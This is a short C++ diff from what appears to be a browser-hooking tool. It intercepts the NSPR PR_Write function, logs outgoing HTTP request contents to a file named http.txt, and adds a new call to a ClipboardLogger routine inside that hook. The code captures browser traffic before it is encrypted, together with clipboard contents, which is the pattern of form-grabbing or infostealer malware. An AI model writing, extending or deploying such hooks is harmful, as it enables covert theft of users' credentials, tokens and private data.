@@ -6,6 +6,8 @@
 #include <string>
 #include "dynamic_library.h"
 #include "utils.h"
+#include "ClipboardLogger.h"
+
 
 PR_Write_t fpPR_Write = nullptr;
 PR_Read_t fpPR_Read = nullptr;
@@ -30,7 +32,8 @@ int HookedPR_Write(void* fd, char* buf, int amount)
     // log HTTP 的封包內容
     if (data.rfind("{") != std::string::npos && StrContain(data, "HTTP"))
     {
-        Log("http.txt", "--- Write ---\n");
+		ClipboardLogger();
+		Log("http.txt", "--- Write ---\n");
         Log("http.txt", buf);
         Log("http.txt", "\n---\n");
     }
